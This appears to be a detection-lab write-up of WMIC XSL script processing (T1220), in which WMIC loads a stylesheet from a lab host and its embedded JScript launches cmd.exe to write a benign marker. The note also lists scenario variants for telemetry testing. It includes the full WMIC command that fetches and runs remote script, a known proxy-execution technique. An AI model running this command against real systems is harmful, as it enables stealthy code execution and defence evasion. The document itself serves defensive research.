# WMIC XSL script-processing scenarios

`wmic.exe` can apply an XSL stylesheet to command output through `/format:`.
Microsoft's XSLT engine supports embedded script through `ms:script`, so a
remote stylesheet can turn the signed WMI command-line utility into a script
execution proxy. This maps to **XSL Script Processing (T1220)**.

## Verified flow: remote benign XSL to marker

1. Kali VM 100 served a 571-byte benign XSL stylesheet over lab-only HTTP from
   `192.168.1.50:18082`.
2. Windows VM 104 started from `win_verify_baseline` and began full-packet
   capture with pktmon.
3. The SYSTEM account invoked:

   ```text
   C:\Windows\System32\wbem\WMIC.exe os get Caption /format:"http://192.168.1.50:18082/benign.xsl"
   ```

4. The stylesheet's JScript function used `WScript.Shell` only to launch
   `cmd.exe`, write `C:\lab\wmic-xsl-marker.txt`, and return the text
   `benign-wmic-xsl`. WMIC exited 0. The transform called the function twice in
   this WMIC flow, producing two direct `cmd.exe` children and overwriting the
   same marker once.
5. Endpoint telemetry and the packet capture were collected, NSM VM 106
   analyzed the capture offline, Kali staging was removed, and VM 104 was
   rolled back.

## Other scenarios considered

- A local XSL file would isolate script processing from HTTP retrieval and
  remove the URL and Internet-cache signals.
- `msxsl.exe` can process scripted XSL when introduced to a host, but it is not
  a built-in signed system binary and has a different provenance profile.
- HTTPS delivery could add SNI, certificate, and TLS-fingerprint signals.
- Different WMIC aliases (`process`, `computersystem`, or `service`) can change
  query output without changing the `/format:` abuse primitive.
- A stylesheet using VBScript instead of JScript could compare Windows Script
  telemetry and child-process behavior.

These variants should be verified separately to preserve honest signal and
false-positive assessments.
